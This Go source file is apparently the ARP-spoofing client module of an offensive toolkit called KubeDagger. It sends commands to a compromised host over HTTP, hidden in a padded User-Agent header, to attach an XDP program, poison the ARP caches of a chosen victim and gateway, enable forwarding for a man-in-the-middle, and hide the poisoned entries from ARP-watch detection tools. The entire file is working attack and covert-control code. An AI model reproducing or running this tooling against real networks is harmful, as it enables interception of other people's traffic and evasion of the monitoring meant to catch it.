package arp_spoof

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type SpoofResult struct {
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, victimIP, gatewayIP, iface, output string) error {
	result := &SpoofResult{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"attach_xdp_egress",
			"attach XDP program to craft and inject gratuitous ARP replies",
			"arp_spoof_attach_xdp",
		},
		{
			"configure_victim",
			"set victim IP and gateway IP for ARP cache poisoning",
			"arp_spoof_set_targets",
		},
		{
			"start_poisoning",
			"begin periodic gratuitous ARP reply injection to poison neighbor caches",
			"arp_spoof_start",
		},
		{
			"enable_forwarding",
			"enable IP forwarding to maintain connectivity during MITM",
			"arp_spoof_forward",
		},
		{
			"hide_from_arp_watch",
			"filter ARP anomaly detection tools from seeing poisoned entries",
			"arp_spoof_hide",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + victimIP + "#" + gatewayIP + "#" + iface
		status := sendCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func sendCommand(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/arp_spoof", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
